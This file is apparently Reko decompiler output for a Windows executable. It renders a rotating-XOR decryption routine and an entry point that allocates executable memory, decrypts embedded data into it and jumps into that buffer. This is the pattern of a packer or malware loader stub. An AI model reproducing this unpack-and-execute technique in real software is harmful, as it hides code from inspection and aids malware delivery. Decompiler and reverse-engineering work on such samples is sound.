// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 1310D000: Register word32 fn1310D000(Stack (ptr32 byte) dwArg04, Stack ptr32 dwArg08, Stack word32 dwArg0C, Stack (ptr32 word32) dwArg10, Stack word32 dwArg14, Stack Eq_8 dwArg18)
word32 fn1310D000(byte * dwArg04, ptr32 dwArg08, word32 dwArg0C, word32 * dwArg10, word32 dwArg14, Eq_8 dwArg18)
{
	*dwArg10 = dwArg0C;
	word32 ebx_106 = dwArg14;
	word16 wLoc10_112 = (word16) (uint32) ((uint64) (uint32) dwArg14 % 0x05);
	byte * dwArg08_105 = dwArg08 + dwArg14;
	while (true)
	{
		dwArg0C = dwArg0C - 0x01;
		if (dwArg0C == 0x00)
			break;
		Mem87[dwArg04 + 0x00:byte] = (byte) ((int32) *dwArg08_105 ^ (word32) Mem12[(int32) wLoc10_112 + dwArg18:byte]);
		word32 edi_88 = (word32) wLoc10_112;
		wLoc10_112 = (word16) (edi_88 + 0x01);
		if ((int32) wLoc10_112 == 0x05)
			wLoc10_112 = 0x00;
		dwArg04 = dwArg04 + 0x01;
		dwArg08_105 = dwArg08_105 + 0x01;
		ebx_106 = edi_88 + 0x01;
	}
	return ebx_106;
}

// 1310D09B: Register Eq_53 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	word32 esp_11;
	word32 ebp_12;
	byte SCZO_13;
	word32 eax_14;
	word32 edi_15;
	word32 edx_16;
	word32 ecx_17;
	word32 esi_18;
	word32 ebx_19;
	byte SZO_20;
	bool C_21;
	bool Z_22;
	byte dl_23;
	WS2HELP.dll!WahOpenNotificationHandleHelper();
	word32 esp_36;
	word32 ebp_37;
	byte SCZO_38;
	word32 eax_39;
	word32 edi_40;
	word32 edx_41;
	word32 ecx_42;
	word32 esi_43;
	word32 ebx_44;
	byte SZO_45;
	bool C_46;
	bool Z_47;
	byte dl_48;
	WS2HELP.dll!WahOpenHandleHelper();
	word32 esp_51;
	word32 ebp_52;
	byte SCZO_53;
	word32 eax_54;
	word32 edi_55;
	word32 edx_56;
	word32 ecx_57;
	word32 esi_58;
	word32 ebx_59;
	byte SZO_60;
	bool C_61;
	bool Z_62;
	byte dl_63;
	WS2HELP.dll!WahOpenNotificationHandleHelper();
	word32 esp_74;
	word32 ebp_75;
	byte SCZO_76;
	word32 eax_77;
	word32 edi_78;
	word32 edx_79;
	word32 ecx_80;
	word32 esi_81;
	word32 ebx_82;
	byte SZO_83;
	bool C_84;
	bool Z_85;
	byte dl_86;
	WS2HELP.dll!WahOpenHandleHelper();
	struct Eq_114 * v6_88 = eax_14 + (eax_77 + 0x80040142);
	word32 esi_100 = v6_88->dw930CD510;
	fn1310D000(fp - 0x023C, fp - 0x023C, 0x04, fp - 0x10, 0x00, fp - 0x0234);
	Eq_136 ebx_125 = v6_88->t930CD514;
	fn1310D000(fp - 600, fp - 0x025C, 0x04, fp - 0x10, 0x04, fp - 0x0234);
	ui32 ebx_148 = v6_88->dw930CD518;
	fn1310D000(fp - 0x14, fp - 0x1C, 0x04, fp - 0x10, 0x08, fp - 0x0234);
	Eq_168 eax_175 = GetModuleHandleA(null);
	word32 esi_183 = v6_88->dw930CD51C;
	fn1310D000(fp - 0x1C, fp - 0x28, 0x04, fp - 0x10, 0x0C, fp - 0x0234);
	Eq_190 dwLoc0248_217 = v6_88->t930CD520;
	fn1310D000(fp - 0x0248, fp - 600, 0x04, fp - 0x10, 0x10, fp - 0x0234);
	Eq_190 esi_246 = ebx_148 * 0x08 + 0x0C;
	ui32 dwLoc024C_241 = 0x14;
	word32 * dwLoc24_244 = (char *) &v6_88->t930CD520 + 0x04;
	word32 eax_267 = VirtualAlloc(eax_14 + (eax_77 + 0x80040142) - 0x800401F0, esi_246 + ebx_125 + esi_100, 0x3000, 0x40);
	word32 dwLoc0C_274 = esi_183 + eax_175 + esi_246;
	Eq_190 dwLoc0264_278 = esi_246;
	ui32 dwLoc08_279 = 0x00;
	Eq_238 dwLoc18_280 = null;
	while (0x01 != 0x00)
	{
		if (dwLoc0264_278 == dwLoc0248_217)
		{
			ui32 esi_407 = dwLoc08_279 + 0x01;
			dwLoc08_279 = esi_407;
			if (esi_407 == ebx_148)
				break;
			word32 edx_413 = *dwLoc24_244;
			*(fp - 776) = fp - 0x0234;
			*(fp - 0x030C) = dwLoc024C_241;
			*(fp - 0x0310) = fp - 0x10;
			*(fp - 788) = 0x04;
			*(fp - 0x0318) = fp - 0x1C - dwLoc024C_241;
			*(fp - 0x031C) = fp - 0x1C;
			fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			LPVOID * edi_443 = dwLoc24_244 + 0x01;
			dwLoc0248_217 = (Eq_190) *edi_443;
			*(fp - 776) = fp - 0x0234;
			ui32 edi_440 = dwLoc024C_241 + 0x04;
			*(fp - 0x030C) = edi_440;
			*(fp - 0x0310) = fp - 0x10;
			*(fp - 788) = 0x04;
			*(fp - 0x0318) = fp - 0x0248 - edi_440;
			*(fp - 0x031C) = fp - 0x0248;
			fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			dwLoc024C_241 = edi_440 + 0x04;
			dwLoc24_244 = (word32 *) ((char *) edi_443 + 0x04);
			dwLoc0264_278 = null;
			dwLoc0C_274 = (byte *) (eax_175 + edx_413 / 0x04);
		}
		Mem392[eax_267 + dwLoc18_280:byte] = Mem0[dwLoc0C_274 + 0x00:byte];
		dwLoc0C_274 = dwLoc0C_274 + 0x01;
		dwLoc18_280 = dwLoc18_280 + 0x01;
		dwLoc0264_278 = (Eq_190) ((char *) dwLoc0264_278 + 0x01);
	}
	*(fp - 776) = fp - 0x0234;
	*(fp - 0x030C) = (LPVOID *) esi_246;
	*(fp - 0x0310) = fp - 0x0238;
	*(fp - 788) = (LPVOID *) ebx_125;
	Eq_264 esi_316 = eax_267 - esi_246;
	*(fp - 0x0318) = (LPVOID *) esi_316;
	*(fp - 0x031C) = (LPVOID *) eax_267;
	word32 ebx_329 = fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	*(fp - 776) = fp;
	*(fp - 0x030C) = fp - 0x0234;
	*(fp - 0x0310) = (LPVOID *) ebx_125;
	*(fp - 788) = esi_100;
	*(fp - 0x0318) = (LPVOID *) eax_267;
	word32 edi_352 = eax_267 + ebx_125;
	*(fp - 0x031C) = (LPVOID *) edi_352;
	word32 esp_356;
	word32 ebp_357;
	byte SCZO_358;
	Eq_53 eax_359;
	word32 edi_360;
	word32 edx_361;
	word32 ecx_362;
	word32 esi_363;
	word32 ebx_364;
	byte SZO_365;
	bool C_366;
	bool Z_367;
	byte dl_368;
	(eax_267 + 0x0F50)();
	return eax_359;
}

